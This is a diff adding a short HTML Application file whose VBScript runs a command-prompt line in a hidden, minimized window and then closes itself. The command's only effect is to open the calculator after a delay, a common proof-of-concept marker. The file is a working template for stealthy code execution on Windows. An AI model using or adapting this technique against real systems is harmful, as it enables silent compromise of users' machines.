@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION WINDOWSTATE="minimize">
+<script language="VBScript">
+set a = createobject("wscript.shell")
+a.run "cmd.exe /c timeout 5 && start calc",0
+Close
+</script>
+</head>
+</html>
